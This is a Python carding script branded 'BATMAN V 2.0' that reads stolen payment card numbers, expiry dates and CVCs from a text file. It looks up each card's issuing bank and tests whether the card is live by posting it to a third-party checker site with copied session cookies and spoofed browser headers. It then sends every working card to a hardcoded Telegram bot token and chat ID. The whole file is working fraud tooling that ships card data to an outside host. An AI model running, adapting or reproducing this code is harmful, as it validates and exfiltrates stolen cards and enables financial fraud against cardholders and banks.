import requests
import pyfiglet

file=open('BAT.txt',"+r")
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'

logo = pyfiglet.figlet_format('            BATMAN ')
print(Z+logo)
log = pyfiglet.figlet_format(' V 2 . 0 ')
print(F+log)
k=("___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕")
print(X+k)
print(B+k)

k=("___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕")

token="6862864490:AAF-12HQLeHYE5vRqBQo5yj-c7PyOJ8e3dk"
ID=6460596929
print(C+k)
for P in file.readlines():
  start_num = 1
  n = P.split('|')[0]
  mm=P.split('|')[1]
  yy=P.split('|')[2][-2:]
  cvc=P.split('|')[3].replace('\n', '')
  P=P.replace('\n', '')
  try:
    data = requests.get('https://lookup.binlist.net/'+P[:6]).json()
  except:
    pass
  try:
    bank=(data['bank']['name'])
  except:
    bank=('unknown ♡')
  try:
    emj=(data['country']['emoji'])
  except:
    emj=('unknown ♕')
  try:
    cn=(data['country']['name'])
  except:
    cn=('unknown ♡')
  try:
    dicr=(data['scheme'])
  except:
    dicr=('unknown ♕')
  try:
    typ=(data['type'])
  except:
    typ=('unknown ♡')
  try:
    url=(data['bank']['url'])
  except:
    url=('unknown♕')
  cookies = {
    '__gads': 'ID=3207b887e0ef18db-2256c3ac2be00097:T=1685888062:RT=1685888062:S=ALNI_Mb1Y57cSfMdAXlHRQN8rYn8XJBLwg',
    '__gpi': 'UID=00000c3d0c02546a:T=1685888062:RT=1685888062:S=ALNI_MZxOkOa0JM_SZj0VcbfSbymCzba5g',
    'PHPSESSID': 'npumq9cbbpngotau2a19oj3iu6',
}

  headers = {
    'authority': 'checker.visatk.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__gads=ID=3207b887e0ef18db-2256c3ac2be00097:T=1685888062:RT=1685888062:S=ALNI_Mb1Y57cSfMdAXlHRQN8rYn8XJBLwg; __gpi=UID=00000c3d0c02546a:T=1685888062:RT=1685888062:S=ALNI_MZxOkOa0JM_SZj0VcbfSbymCzba5g; PHPSESSID=npumq9cbbpngotau2a19oj3iu6',
    'origin': 'https://checker.visatk.com',
    'referer': 'https://checker.visatk.com/ccn1/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

  data = {
    'ajax': '1',
    'do': 'check',
    'cclist': {P},
}

  response = requests.post('https://checker.visatk.com/ccn1/alien07.php', cookies=cookies, headers=headers, data=data)
  if "Live" in response.text:
      print(F+f'''◆ CC© ➜ {P} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 
𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑨𝑳𝑻𝑬𝑵𝑬𝑵 𝑺𝑬𝑹𝑽𝑬𝑹
~~~♕~~~♕~~~♕~~~♕
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url} ''')
      print(Z+k)
      mgs=f'''◆ CC©  ➜ {P} 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑨𝑳𝑻𝑬𝑵𝑬𝑵 𝑺𝑬𝑹𝑽𝑬𝑹
~~~♕~~~♕~~~♕~~~♕
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url} 
~~~♕~~~♕~~~♕~~~♕
◆ 𝑩𝒀: @knownme30
◆𝑷𝑹𝑶𝑿𝒀𝑺: 𝑷𝑹𝑶𝑿𝒀 𝑳𝑰𝑽𝑬 ✅ '''
      tlg = f"https://api.telegram.org/bot6862864490:AAF-12HQLeHYE5vRqBQo5yj-c7PyOJ8e3dk/sendMessage?chat_id={6460596929}&text={mgs}"
      i = requests.post(tlg)
  else:
      print(Z+f'''◆ CC©  ➜ {P} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 
Declind❌
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 
Declind
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑨𝑳𝑻𝑬𝑵𝑬𝑵 𝑺𝑬𝑹𝑽𝑬𝑹
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url} ''')
      print(Z+k)
